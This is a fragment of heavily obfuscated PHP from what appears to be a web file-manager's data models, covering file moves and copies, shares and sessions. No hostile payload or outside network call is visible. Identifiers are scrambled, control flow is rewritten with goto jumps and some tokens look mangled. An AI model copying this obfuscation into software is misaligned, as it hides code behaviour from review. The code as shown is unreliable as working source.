$this->folderSizeReset($aÕˆÆÚÚÏß); Hook::trigger($fŞ«ó§Á‡[556], $Bôˆ‚à…Ó„); goto bˆ‡‡Àôî´; Dã´“ˆÏƒ: } } $fÕñø­Ä­ = $aâÑ›ÇëµÉ ? $aâÑ›ÇëµÉ : $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[38]]; $this->lockMoveStart($Bˆä…—˜ª); goto a©—Æ‹íéÄ; AñîÒÓµßì: $fŞ«ó§Á‡ =& $_SERVER[±á õÁ]; $d¸ÎÇ™Ú¼¾ = $this->sourceInfo($Bˆä…—˜ª); $CÍ·º¬âó = $this->sourceInfo($aÕˆÆÚÚÏß); goto e®ß¯÷¯êâ; a©—Æ‹íéÄ: $this->lockWriteStart($aÕˆÆÚÚÏß, $fÕñø­Ä­); $C†›†…—‡¨ = array($fŞ«ó§Á‡[526] => array(), $fŞ«ó§Á‡[557] => !1); $this->clearShare($Bˆä…—˜ª, $aÕˆÆÚÚÏß); goto DŒ²…Ÿ©ÌÈ; e®ß¯÷¯êâ: if ($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[486]] == $CÍ·º¬âó[$fŞ«ó§Á‡[393]]) { if ($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[421]] == $fŞ«ó§Á‡[93]) { Model($fŞ«ó§Á‡[419])->restore(array($Bˆä…—˜ª)); } if (!$aâÑ›ÇëµÉ || $aâÑ›ÇëµÉ == $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[38]]) { return $Bˆä…—˜ª; } } $Bôˆ‚à…Ó„ = $this->pathInfoMore($Bˆä…—˜ª); if ($this->isParentOf($Bˆä…—˜ª, $aÕˆÆÚÚÏß)) { return !1; } goto F´ãèÕŞ¼“; C„æ¸öŒé: $this->updateModifyTime($A¯„ğÅ©); Model($fŞ«ó§Á‡[530])->eventMove($Bˆä…—˜ª, $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[486]], $aÕˆÆÚÚÏß); Hook::trigger($fŞ«ó§Á‡[556], $Bôˆ‚à…Ó„); goto fÀÂÏ‘¢¦; F´ãèÕŞ¼“: if (!$d¸ÎÇ™Ú¼¾ || !$CÍ·º¬âó || $CÍ·º¬âó[$fŞ«ó§Á‡[394]] != $fŞ«ó§Á‡[93]) { return !1; } Hook::trigger($fŞ«ó§Á‡[555], $Bôˆ‚à…Ó„); $this->targetIsDelete = intval($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[421]]); goto dˆª˜Ğ©óé; C´Ø‘Ğâ–: $this->folderSizeReset($aÕˆÆÚÚÏß); $A¯„ğÅ© = array($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[486]], $aÕˆÆÚÚÏß); if ($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[394]] == $fŞ«ó§Á‡[93]) { $A¯„ğÅ©[] = $Bˆä…—˜ª; } goto C„æ¸öŒé; E£¿‚ÉãŒ: if ($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[394]] == $fŞ«ó§Á‡[93] && $a‰ê¾µˆ«) { $this->folderSizeResetChildren($aÇÎš¼½‡); } Model($fŞ«ó§Á‡[181])->linkAdd($C†›†…—‡¨[$fŞ«ó§Á‡[526]]); if ($a‰ê¾µˆ« && $C†›†…—‡¨[$fŞ«ó§Á‡[557]]) { $this->removeNow($Bˆä…—˜ª, !1); } goto AÊ©Óß˜’; c‰˜÷­: } private function _move($E¶ÚŠ®ç¥, $eó›ˆ“÷„¤, $Bå­Ä‰²…¨, &$BÌ½Èñ», $b±×Œ¤ã½ = '') { goto AœŸï³ì«; d²’…ùæ›é: $this->lockWriteStart($eó›ˆ“÷„¤, $fùõÒ£ŠŸ); if (!$D·‡åˆ·¥Â) { return $this->_moveForce($E¶ÚŠ®ç¥, $eó›ˆ“÷„¤, $fùõÒ£ŠŸ); } $dĞ‰ØâîÕ = $D·‡åˆ·¥Â; goto Dèîæ†’œ; Dèîæ†’œ: $CÚ°ìñ‚êõ = !1; if ($a³„ÛÖöÂŠ) { if ($Bå­Ä‰²…¨ == REPEAT_RENAME_FOLDER) { $fùõÒ£ŠŸ = $this->fileNameAuto($eó›ˆ“÷„¤, $fùõÒ£ŠŸ, $Bå­Ä‰²…¨, $a³„ÛÖöÂŠ); $dĞ‰ØâîÕ = $this->_moveForce($E¶ÚŠ®ç¥, $eó›ˆ“÷„¤, $fùõÒ£ŠŸ); } else { if ($Bå­Ä‰²…¨ == REPEAT_RENAME_FOLDER) { $Bå­Ä‰²…¨ = REPEAT_RENAME; } $AŸ¡œˆ¡ğÆ = $this->_childrenListSelect($E¶ÚŠ®ç¥); foreach ($AŸ¡œˆ¡ğÆ as $fŒªôÍ¾–) { $this->_move($fŒªôÍ¾–[$f ÀÚ¹ÏÓ[393]], $D·‡åˆ·¥Â, $Bå­Ä‰²…¨, $BÌ½Èñ»); } $CÚ°ìñ‚êõ = !0; } } else { if ($Bå­Ä‰²…¨ == REPEAT_SKIP) { $CÚ°ìñ‚êõ = !0; } else { if ($Bå­Ä‰²…¨ == REPEAT_RENAME || $Bå­Ä‰²…¨ == REPEAT_RENAME_FOLDER) { $fùõÒ£ŠŸ = $this->fileNameAuto($eó›ˆ“÷„¤, $fùõÒ£ŠŸ, $Bå­Ä‰²…¨, $a³„ÛÖöÂŠ); $dĞ‰ØâîÕ = $this->_moveForce($E¶ÚŠ®ç¥, $eó›ˆ“÷„¤, $fùõÒ£ŠŸ); } else { if ($Bå­Ä‰²…¨ == REPEAT_REPLACE) { $D³ëáøŠ¸¢ = $this->sourceInfoCache($D·‡åˆ·¥Â); $F³¼¤£ï = $this->fileHistory($D³ëáøŠ¸¢, $BÕÉ©ë¥ÏÏ[$f ÀÚ¹ÏÓ[443]], $BÕÉ©ë¥ÏÏ[$f ÀÚ¹ÏÓ[87]]); if ($F³¼¤£ï) { $BÌ½Èñ»[$f ÀÚ¹ÏÓ[526]][] = $BÕÉ©ë¥ÏÏ[$f ÀÚ¹ÏÓ[443]]; } else { $CÚ°ìñ‚êõ = !0; } } } } } if ($CÚ°ìñ‚êõ && !$BÌ½Èñ»[$f ÀÚ¹ÏÓ[557]]) { $BÌ½Èñ»[$f ÀÚ¹ÏÓ[557]] = !0; } goto a†¶Şœ¬áİ; d»éôÚ‡: $fùõÒ£ŠŸ = $b±×Œ¤ã½ ? $b±×Œ¤ã½ : $BÕÉ©ë¥ÏÏ[$f ÀÚ¹ÏÓ[38]]; $D·‡åˆ·¥Â = $this->fileNameExistCache($eó›ˆ“÷„¤, $fùõÒ£ŠŸ); $this->lockMoveStart($E¶ÚŠ®ç¥); goto d²’…ùæ›é; a†¶Şœ¬áİ: return $dĞ‰ØâîÕ; goto bŒ¯•õ½‰”; AœŸï³ì«: $f ÀÚ¹ÏÓ =& $_SERVER[±á õÁ]; $BÕÉ©ë¥ÏÏ = $this->sourceInfo($E¶ÚŠ®ç¥); $a³„ÛÖöÂŠ = $BÕÉ©ë¥ÏÏ[$f ÀÚ¹ÏÓ[394]] == $f ÀÚ¹ÏÓ[93]; goto d»éôÚ‡; bŒ¯•õ½‰”: } private function _moveForce($Döá­•††, $D‡Äì°±š, $cƒãï‰ê¬Í) { goto d¨ÓäÅÔå¼; EÈö˜¨ˆĞ³: $d˜ÌäõªÁ = $Eêßø¸Œ¤æ[$E»†ÕïŠª[394]] == $E»†ÕïŠª[93]; $F¸çÄ¦‹Á‹ = array($E»†ÕïŠª[392] => $EŸ·ŒØŠéÙ[$E»†ÕïŠª[393]], $E»†ÕïŠª[550] => $EŸ·ŒØŠéÙ[$E»†ÕïŠª[484]] . $EŸ·ŒØŠéÙ[$E»†ÕïŠª[393]] . $E»†ÕïŠª[57], $E»†ÕïŠª[546] => $EŸ·ŒØŠéÙ[$E»†ÕïŠª[395]], $E»†ÕïŠª[547] => $EŸ·ŒØŠéÙ[$E»†ÕïŠª[481]], $E»†ÕïŠª[549] => USER_ID, $E»†ÕïŠª[410] => $cƒãï‰ê¬Í); $bîàŒšÖù¦ = $Eêßø¸Œ¤æ[$E»†ÕïŠª[395]] == SourceModel::TYPE_GROUP && $EŸ·ŒØŠéÙ[$E»†ÕïŠª[395]] == SourceModel::TYPE_GROUP && $Eêßø¸Œ¤æ[$E»†ÕïŠª[481]] == $EŸ·ŒØŠéÙ[$E»†ÕïŠª[481]]; goto CÒ÷ìÑ²ï×; d¨ÓäÅÔå¼: $E»†ÕïŠª =& $_SERVER[±á õÁ]; $Eêßø¸Œ¤æ = $this->sourceInfo($Döá­•††); $EŸ·ŒØŠéÙ = $this->sourceInfo($D‡Äì°±š); goto EÈö˜¨ˆĞ³; CÒ÷ìÑ²ï×: if (!$bîàŒšÖù¦) { Model($E»†ÕïŠª[479])->authClear($Döá­•††); } $fõáÏ‘ª¥¦ = $Eêßø¸Œ¤æ[$E»†ÕïŠª[421]] == $E»†ÕïŠª[93] && $EŸ·ŒØŠéÙ[$E»†ÕïŠª[421]] != $E»†ÕïŠª[93]; if ($fõáÏ‘ª¥¦) { $F¸çÄ¦‹Á‹[$E»†ÕïŠª[420]] = 0; } goto f±…÷‘Ìñ; f±…÷‘Ìñ: if ($d˜ÌäõªÁ) { $Bì‰ÍŸñ¬Ç = array($E»†ÕïŠª[550] => array($E»†ÕïŠª[508], $Eêßø¸Œ¤æ[$E»†ÕïŠª[484]] . $Eêßø¸Œ¤æ[$E»†ÕïŠª[393]] . $E»†ÕïŠª[509])); $b·³ò´øŸŠ = $Eêßø¸Œ¤æ[$E»†ÕïŠª[484]] . $Eêßø¸Œ¤æ[$E»†ÕïŠª[393]] . $E»†ÕïŠª[57]; $BÏÕ”¡ìˆé = $EŸ·ŒØŠéÙ[$E»†ÕïŠª[484]] . $EŸ·ŒØŠéÙ[$E»†ÕïŠª[393]] . $E»†ÕïŠª[57] . $Eêßø¸Œ¤æ[$E»†ÕïŠª[393]] . $E»†ÕïŠª[57]; $E´–ÈÅíÀ¶ = array($E»†ÕïŠª[550] => array($E»†ÕïŠª[558], "\x72\x65\160\x6c\x61\143\x65\50\160\141\x72\145\156\164\x4c\145\x76\x65\154\x2c\x27{$b·³ò´øŸŠ}\47\x2c\47{$BÏÕ”¡ìˆé}\x27\x29"), $E»†ÕïŠª[546] => $EŸ·ŒØŠéÙ[$E»†ÕïŠª[395]], $E»†ÕïŠª[547] => $EŸ·ŒØŠéÙ[$E»†ÕïŠª[481]]); if ($fõáÏ‘ª¥¦) { $E´–ÈÅíÀ¶[$E»†ÕïŠª[420]] = 0; } $this->where($Bì‰ÍŸñ¬Ç)->data($E´–ÈÅíÀ¶)->save(); } $this->where(array($E»†ÕïŠª[407] => $Döá­•††))->data($F¸çÄ¦‹Á‹)->save(); return $Döá­•††; goto Dµ®ßÂ…¡; Dµ®ßÂ…¡: } private function clearShare($f¥³­•›Ï¾, $Bô¥³ùÉ²—) { goto cÒ…™Ÿò¼…; BÛª÷”¿âµ: if (!$e¶çšĞ’Şø) { return; } $e¶çšĞ’Şø = array_to_keyvalue($e¶çšĞ’Şø, $Cç¶‘¿Ÿà[43], $Cç¶‘¿Ÿà[464]); $c‰ùç««ƒ = array($Cç¶‘¿Ÿà[464] => array($Cç¶‘¿Ÿà[7], $e¶çšĞ’Şø)); goto d´½“ñ‰ôŒ; E˜Ê˜Áæé: if (!$f±ôÁ‘íÄ™) { return; } $c‰ùç««ƒ = array($Cç¶‘¿Ÿà[393] => array($Cç¶‘¿Ÿà[7], $f±ôÁ‘íÄ™), $Cç¶‘¿Ÿà[471] => 1); $e¶çšĞ’Şø = Model($Cç¶‘¿Ÿà[560])->field($Cç¶‘¿Ÿà[464])->where($c‰ùç««ƒ)->select(); goto BÛª÷”¿âµ; d´½“ñ‰ôŒ: Model($Cç¶‘¿Ÿà[560])->where($c‰ùç««ƒ)->save(array($Cç¶‘¿Ÿà[471] => 0)); Model($Cç¶‘¿Ÿà[561])->where($c‰ùç««ƒ)->delete(); goto Cöèãò¯ª; b•åÈ‰Ú¶Ô: if ($b‡ÛÖåš¹[$Cç¶‘¿Ÿà[481]] == $e¬ëİäÀìø[$Cç¶‘¿Ÿà[481]] && $b‡ÛÖåš¹[$Cç¶‘¿Ÿà[395]] == $Cç¶‘¿Ÿà[559]) { return; } $c‰ùç««ƒ = array($Cç¶‘¿Ÿà[484] => array($Cç¶‘¿Ÿà[508], $b‡ÛÖåš¹[$Cç¶‘¿Ÿà[484]] . $f¥³­•›Ï¾ . $Cç¶‘¿Ÿà[509])); $f±ôÁ‘íÄ™ = $this->field($Cç¶‘¿Ÿà[407])->where($c‰ùç««ƒ)->getField($Cç¶‘¿Ÿà[393], !0); goto E˜Ê˜Áæé; cÒ…™Ÿò¼…: $Cç¶‘¿Ÿà =& $_SERVER[±á õÁ]; $b‡ÛÖåš¹ = $this->sourceInfo($f¥³­•›Ï¾); $e¬ëİäÀìø = $this->sourceInfo($Bô¥³ùÉ²—); goto b•åÈ‰Ú¶Ô; Cöèãò¯ª: } public function copyFolderFromIO($A¦®õóË÷, $bè‰¡®‚É, $fâ£Š­‚ë, $fï š¼­Îç, $càËº­Ó›, $BÃ’‚›Óß = false) { goto BŒ‹¾ÆÛ™§; e™Êâ°˜Çê: Model($E’ñ˜Í„Ó[446])->linkAdd($aó´ò–†¢£[$E’ñ˜Í„Ó[526]]); Model($E’ñ˜Í„Ó[446])->remove($aó´ò–†¢£[$E’ñ˜Í„Ó[562]]); $this->folderSizeReset($fâ£Š­‚ë); goto FƒÚÓªƒ¼ç; Bàóù—œ‡: if ($aàÑ¿¿Äš‡) { $this->_childrenAllMake($aàÑ¿¿Äš‡); } Hook::trigger($E’ñ˜Í„Ó[563]); $this->_copyChildTo($A¦®õóË÷, $bè‰¡®‚É, $Câ‘Ó›Æ¼Ü, $fï š¼­Îç, $aó´ò–†¢£, $càËº­Ó›); goto E¤ê‚ºœ‹; Bâîé§êâÃ: Model($E’ñ˜Í„Ó[529])->addAll($aó´ò–†¢£[$E’ñ˜Í„Ó[527]], array(), !0); Model($E’ñ˜Í„Ó[530])->eventCopy($Câ‘Ó›Æ¼Ü); $this->saveAll($aó´ò–†¢£[$E’ñ˜Í„Ó[528]]); goto e™Êâ°˜Çê; FƒÚÓªƒ¼ç: $this->updateModifyTime($fâ£Š­‚ë); return $Câ‘Ó›Æ¼Ü; goto CŠ…Å†Ò„; F´è‹»Ïæ: $aàÑ¿¿Äš‡ = $this->fileNameExist($fâ£Š­‚ë, $b±İÓº°œÜ); $Câ‘Ó›Æ¼Ü = $this->mkdir($fâ£Š­‚ë, $b±İÓº°œÜ, $fï š¼­Îç); if (!$aàÑ¿¿Äš‡ || $fï š¼­Îç == REPEAT_RENAME_FOLDER) { $fï š¼­Îç = !1; } goto Bàóù—œ‡; E¤ê‚ºœ‹: Hook::trigger($E’ñ˜Í„Ó[564]); if ($Câ‘Ó›Æ¼Ü) { $this->folderSizeResetChildren($Câ‘Ó›Æ¼Ü); } $this->_childrenListClear(); goto Bâîé§êâÃ; BŒ‹¾ÆÛ™§: $E’ñ˜Í„Ó =& $_SERVER[±á õÁ]; $aó´ò–†¢£ = array($E’ñ˜Í„Ó[527] => array(), $E’ñ˜Í„Ó[528] => array(), $E’ñ˜Í„Ó[526] => array(), $E’ñ˜Í„Ó[562] => array()); $b±İÓº°œÜ = $BÃ’‚›Óß ? $BÃ’‚›Óß : $A¦®õóË÷->getPathName($A¦®õóË÷->pathThis($bè‰¡®‚É)); goto F´è‹»Ïæ; CŠ…Å†Ò„: } private function _copyChildTo($b„¡˜§Ã‰õ, $Føó•Ìá£õ, $AÓÁ®ã´, $cìŠèÉ¡Ô, &$bÚ‰…å¼×, $a˜ºÖ¡ïœò) { goto a‹Â´„‡¶ª; a‹Â´„‡¶ª: $C²‚ìÆç³ï =& $_SERVER[±á õÁ]; $E’¾‚îòÜ† = $this->sourceInfoCache($AÓÁ®ã´); $EµµŒÖºµ» = $b„¡˜§Ã‰õ->listPath($Føó•Ìá£õ); goto aË’çºôĞØ; aË’çºôĞØ: $cŒÃ­«ÅÕù = array_merge($EµµŒÖºµ»[$C²‚ìÆç³ï[83]], $EµµŒÖºµ»[$C²‚ìÆç³ï[84]]); $a•åì½Ïé‹ = $this->_addFiles($b„¡˜§Ã‰õ, $EµµŒÖºµ»[$C²‚ìÆç³ï[83]], $a˜ºÖ¡ïœò); $eôÉî¢°…™ = array(); goto Fø‚¨©’×; c„ò»“’ïï: $FœßÄ…¡ƒâ = $this->_childrenList($AÓÁ®ã´); $FœßÄ…¡ƒâ = array_to_keyvalue($FœßÄ…¡ƒâ, $C²‚ìÆç³ï[38]); foreach ($cŒÃ­«ÅÕù as $a“¥õÜòØÖ) { $E¼æó–ºñ” = $FœßÄ…¡ƒâ[$a“¥õÜòØÖ[$C²‚ìÆç³ï[38]]]; $a³µ›É˜Ö£ = $E¼æó–ºñ”[$C²‚ìÆç³ï[393]]; $this->_copyApplyMeta($E¼æó–ºñ”, $bÚ‰…å¼×); if ($a“¥õÜòØÖ[$C²‚ìÆç³ï[39]] == $C²‚ìÆç³ï[86]) { $a“¥õÜòØÖ[$C²‚ìÆç³ï[85]] = $b„¡˜§Ã‰õ->getPathInner($a“¥õÜòØÖ[$C²‚ìÆç³ï[85]]); $this->_copyChildTo($b„¡˜§Ã‰õ, $a“¥õÜòØÖ[$C²‚ìÆç³ï[85]], $a³µ›É˜Ö£, $cìŠèÉ¡Ô, $bÚ‰…å¼×, $a˜ºÖ¡ïœò); } } goto Bù•¨±é˜„; Fø‚¨©’×: foreach ($cŒÃ­«ÅÕù as &$a“¥õÜòØÖ) { goto cééˆ¯Ö¡”; cééˆ¯Ö¡”: if (isset($a•åì½Ïé‹[$a“¥õÜòØÖ[$C²‚ìÆç³ï[38]]])) { $a“¥õÜòØÖ = $a•åì½Ïé‹[$a“¥õÜòØÖ[$C²‚ìÆç³ï[38]]]; } $a“¥õÜòØÖ[$C²‚ìÆç³ï[394]] = $a“¥õÜòØÖ[$C²‚ìÆç³ï[39]] == $C²‚ìÆç³ï[86]; $a“¥õÜòØÖ[$C²‚ìÆç³ï[396]] = _get($a“¥õÜòØÖ, $C²‚ìÆç³ï[175], $C²‚ìÆç³ï[43]); goto c¤˜é…·øÉ; c‚Ş¬Æ¾‡: if ($cìŠèÉ¡Ô) { $a…ÁÉãèÉï = $this->fileNameExistCache($AÓÁ®ã´, $a“¥õÜòØÖ[$C²‚ìÆç³ï[38]]); if ($a…ÁÉãèÉï) { if ($a“¥õÜòØÖ[$C²‚ìÆç³ï[394]] || $cìŠèÉ¡Ô == REPEAT_SKIP) { continue; } if ($cìŠèÉ¡Ô == REPEAT_REPLACE) { $E¼æó–ºñ” = $this->sourceInfoCache($a…ÁÉãèÉï); $Cîƒ¯“ƒêÛ = $this->fileHistory($E¼æó–ºñ”, $a“¥õÜòØÖ[$C²‚ìÆç³ï[443]], $a“¥õÜòØÖ[$C²‚ìÆç³ï[87]]); if ($Cîƒ¯“ƒêÛ) { $bÚ‰…å¼×[$C²‚ìÆç³ï[526]][] = $a“¥õÜòØÖ[$C²‚ìÆç³ï[443]]; } continue; } else { if ($cìŠèÉ¡Ô == REPEAT_RENAME) { $a“¥õÜòØÖ[$C²‚ìÆç³ï[38]] = $this->fileNameAutoCache($AÓÁ®ã´, $a“¥õÜòØÖ[$C²‚ìÆç³ï[38]], $cìŠèÉ¡Ô, !1); } } } } if (!$a“¥õÜòØÖ[$C²‚ìÆç³ï[394]] && $a“¥õÜòØÖ[$C²‚ìÆç³ï[443]]) { $bÚ‰…å¼×[$C²‚ìÆç³ï[526]][] = $a“¥õÜòØÖ[$C²‚ìÆç³ï[443]]; } $eôÉî¢°…™[] = $this->_makeItemData($a“¥õÜòØÖ, $E’¾‚îòÜ†, $a“¥õÜòØÖ[$C²‚ìÆç³ï[38]]); goto c’æ·µİŠÔ; c¤˜é…·øÉ: $a“¥õÜòØÖ[$C²‚ìÆç³ï[87]] = _get($a“¥õÜòØÖ, $C²‚ìÆç³ï[87], 0); $a“¥õÜòØÖ[$C²‚ìÆç³ï[443]] = _get($a“¥õÜòØÖ, $C²‚ìÆç³ï[443], 0); if (!isset($a“¥õÜòØÖ[$C²‚ìÆç³ï[565]]) && $a“¥õÜòØÖ[$C²‚ìÆç³ï[443]]) { $bÚ‰…å¼×[$C²‚ìÆç³ï[562]][] = $a“¥õÜòØÖ[$C²‚ìÆç³ï[443]]; } goto c‚Ş¬Æ¾‡; c’æ·µİŠÔ: } unset($a“¥õÜòØÖ); if (!empty($eôÉî¢°…™)) { $this->addAll($eôÉî¢°…™); } goto c„ò»“’ïï; Bù•¨±é˜„: } private function _addFiles($bœËœ‰Áå, $D×°§£‘¸ã, $EÕ¤·Ô»Â‹) { goto AË„¬¦ò Ø; A…ÉÇøô‡ˆ: $b‹÷İöÌœ->addAll($Aéâ¦ùÑø); $d¯ßé´¿ßÅ = array($Dæê˜ßÜŞÍ[177] => array($Dæê˜ßÜŞÍ[7], array_keys($dãŠ£ñ¬Š¾))); $aºà‹©‰ò‹ = $b‹÷İöÌœ->where($d¯ßé´¿ßÅ)->select(); goto Côò¶â¼É‹; c«ÊÑ›¶…º: foreach ($D×°§£‘¸ã as $AËõ“İÂ©¾) { $dĞ´…½÷Û[$AËõ“İÂ©¾[$Dæê˜ßÜŞÍ[38]]] = $AËõ“İÂ©¾; } return $dĞ´…½÷Û; goto c¿†¢ğÇàº; dµÊÀâŸãæ: $b‹÷İöÌœ = Model($Dæê˜ßÜŞÍ[568]); $aºà‹©‰ò‹ = $b‹÷İöÌœ->where($d¯ßé´¿ßÅ)->select(); $aºà‹©‰ò‹ = $aºà‹©‰ò‹ ? $aºà‹©‰ò‹ : array(); goto d½¤ÈôòÔ; d½¤ÈôòÔ: foreach ($aºà‹©‰ò‹ as $CÍÖĞáë¤) { if (!isset($dãŠ£ñ¬Š¾[$CÍÖĞáë¤[$Dæê˜ßÜŞÍ[177]]])) { continue; } $EÇ¢¬èœ = $dãŠ£ñ¬Š¾[$CÍÖĞáë¤[$Dæê˜ßÜŞÍ[177]]]; foreach ($EÇ¢¬èœ as &$B‘áõñ¿„ù) { $B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[443]] = $CÍÖĞáë¤[$Dæê˜ßÜŞÍ[443]]; $B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[565]] = !0; } unset($B‘áõñ¿„ù); } $Aéâ¦ùÑø = array(); foreach ($D×°§£‘¸ã as $aâÁ£äÈ¾) { if (isset($aâÁ£äÈ¾[$Dæê˜ßÜŞÍ[565]]) && $aâÁ£äÈ¾[$Dæê˜ßÜŞÍ[565]]) { continue; } $dÔÏÆ‹ƒ“ = $bœËœ‰Áå->getPathInner($aâÁ£äÈ¾[$Dæê˜ßÜŞÍ[85]]); $e™ƒ“©÷ùØ = $b‹÷İöÌœ->addFileMake($dÔÏÆ‹ƒ“, $aâÁ£äÈ¾[$Dæê˜ßÜŞÍ[87]], $aâÁ£äÈ¾[$Dæê˜ßÜŞÍ[178]], $aâÁ£äÈ¾[$Dæê˜ßÜŞÍ[177]], $aâÁ£äÈ¾[$Dæê˜ßÜŞÍ[38]], $EÕ¤·Ô»Â‹); $Aéâ¦ùÑø[] = $e™ƒ“©÷ùØ; } goto A…ÉÇøô‡ˆ; Côò¶â¼É‹: $aºà‹©‰ò‹ = $aºà‹©‰ò‹ ? $aºà‹©‰ò‹ : array(); foreach ($aºà‹©‰ò‹ as $CÍÖĞáë¤) { if (!isset($dãŠ£ñ¬Š¾[$CÍÖĞáë¤[$Dæê˜ßÜŞÍ[177]]])) { continue; } $b£ÂŞåì‚Ã =& $dãŠ£ñ¬Š¾[$CÍÖĞáë¤[$Dæê˜ßÜŞÍ[177]]]; foreach ($b£ÂŞåì‚Ã as &$B‘áõñ¿„ù) { $B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[443]] = $CÍÖĞáë¤[$Dæê˜ßÜŞÍ[443]]; } unset($B‘áõñ¿„ù); } $dĞ´…½÷Û = array(); goto c«ÊÑ›¶…º; cæÒˆÈõá: foreach ($D×°§£‘¸ã as &$B‘áõñ¿„ù) { goto BğÆÓâÆ•ß; BğÆÓâÆ•ß: Hook::trigger($Dæê˜ßÜŞÍ[566], $B‘áõñ¿„ù); $B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[85]] = $bœËœ‰Áå->getPathInner($B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[85]]); $cÄÆŠÌª°å = $bœËœ‰Áå->hashSimple($B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[85]]); goto eÃĞ¦¡ŞÔí; E®»ƒ¿¢Í¹: $B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[177]] = $F²ñ§¯ñ¬; Hook::trigger($Dæê˜ßÜŞÍ[567], $B‘áõñ¿„ù); $dãŠ£ñ¬Š¾[$F²ñ§¯ñ¬][] =& $B‘áõñ¿„ù; goto déÑ³œ¡†; déÑ³œ¡†: if (count($dãŠ£ñ¬Š¾[$F²ñ§¯ñ¬]) > 1) { $B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[565]] = !0; } goto E£Í›‚ÙØ“; eÃĞ¦¡ŞÔí: $F²ñ§¯ñ¬ = $bœËœ‰Áå->hashMd5($B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[85]]); if (strlen($F²ñ§¯ñ¬) > 10 && !isset($dãŠ£ñ¬Š¾[$F²ñ§¯ñ¬])) { $dãŠ£ñ¬Š¾[$F²ñ§¯ñ¬] = array(); } $B‘áõñ¿„ù[$Dæê˜ßÜŞÍ[178]] = $cÄÆŠÌª°å; goto E®»ƒ¿¢Í¹; E£Í›‚ÙØ“: } unset($B‘áõñ¿„ù); $d¯ßé´¿ßÅ = array($Dæê˜ßÜŞÍ[177] => array($Dæê˜ßÜŞÍ[7], array_keys($dãŠ£ñ¬Š¾))); goto dµÊÀâŸãæ; AË„¬¦ò Ø: $Dæê˜ßÜŞÍ =& $_SERVER[±á õÁ]; if (!$D×°§£‘¸ã || count($D×°§£‘¸ã) == 0) { return array(); } $dãŠ£ñ¬Š¾ = array(); goto cæÒˆÈõá; c¿†¢ğÇàº: } } goto C¢Æ·ò»â²; bœøíàˆÉ: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\x5f\x73\x65\x73\163\151\157\156"; public function get($b¸¿÷²„¦) { $b’‹¡ßÚîí =& $_SERVER[±á õÁ]; $Aµ„Ô¿µŞ„ = $this->where(array($b’‹¡ßÚîí[1741] => $b¸¿÷²„¦))->find(); if (!is_array($Aµ„Ô¿µŞ„)) { return !1; } return $Aµ„Ô¿µŞ„[$b’‹¡ßÚîí[717]]; } public function set($CÕ°‘Ğ¼÷Š, $e°ƒŸÉàŠ¨, $fİ‚Ò§§Õ« = 3600) { $AÃí—……ì“ =& $_SERVER[±á õÁ]; $Fâ©‰ÅÂÌ = array($AÃí—……ì“[1741] => $CÕ°‘Ğ¼÷Š, $AÃí—……ì“[1653] => $e°ƒŸÉàŠ¨, $AÃí—……ì“[1742] => $fİ‚Ò§§Õ« + time()); if (Session::get($AÃí—……ì“[1743])) { $Fâ©‰ÅÂÌ[$AÃí—……ì“[1463]] = Session::get($AÃí—……ì“[1743]); } else { $Fâ©‰ÅÂÌ[$AÃí—……ì“[1463]] = 0; } if ($this->get($CÕ°‘Ğ¼÷Š)) { return $this->where(array($AÃí—……ì“[1741] => $CÕ°‘Ğ¼÷Š))->save($Fâ©‰ÅÂÌ); } else { return $this->add($Fâ©‰ÅÂÌ, array(), !0); } } public function remove($DÆê“îˆ¸Ë) { return $this->where(array($_SERVER[±á õÁ][1741] => $DÆê“îˆ¸Ë))->delete(); } public function clearTimeout() { return $this->where($_SERVER[±á õÁ][1744] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\x54\x69\155\145", "\164\151\x6d\x65", "\151\x6e\163\x65\162\164\54\165\160\144\141\x74\x65", "\146\165\156\143\x74\151\157\x6e"), array("\x63\162\145\141\x74\145\x54\x69\155\145", "\164\151\x6d\x65", "\x69\156\x73\x65\162\164", "\146\165\156\x63\x74\x69\157\156"), array("\157\160\164\x69\157\x6e\x73", '', "\151\x6e\x73\x65\x72\164\54\165\160\144\x61\164\x65\54\163\x65\x6c\x65\143\164", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($d†Ñ”Ê£›) { $FêÎÉŸšÎÏ =& $_SERVER[±á õÁ]; $BÄÌ¸Èä©Á = isset($d†Ñ”Ê£›[0]) ? $d†Ñ”Ê£›[0] : !1; return array($FêÎÉŸšÎÏ[1745] => array(USER_ID, $FêÎÉŸšÎÏ[1746]), $FêÎÉŸšÎÏ[1694] => array($BÄÌ¸Èä©Á, $FêÎÉŸšÎÏ[1747])); } protected function listSimple() { $Aˆë”«Ö±í = array($_SERVER[±á õÁ][1463] => USER_ID); $aÓç’ˆíêª = $this->field($this->fieldList)->where($Aˆë”«Ö±í)->select(); return $aÓç’ˆíêª ? $aÓç’ˆíêª : array(); } protected function getInfo($b‹¦Í¨ÍåÙ, $EòÃî­Ã = false) { $Eßá—†¼ =& $_SERVER[±á õÁ]; if ($EòÃî­Ã) { return $this->_getShareInfo(array($Eßá—†¼[464] => $b‹¦Í¨ÍåÙ)); } $f”Ñ•Ù³ß = $this->cacheFunctionGet($Eßá—†¼[1748], $b‹¦Í¨ÍåÙ); return $f”Ñ•Ù³ß; } public function getInfoByHash($dÔİëğ‚ºŸ) { return $this->_getShareInfo(array($_SERVER[±á õÁ][466] => $dÔİëğ‚ºŸ)); } public function getInfoByPath($E´³êö»Â¹) { $BàÉÅ¸¦“è =& 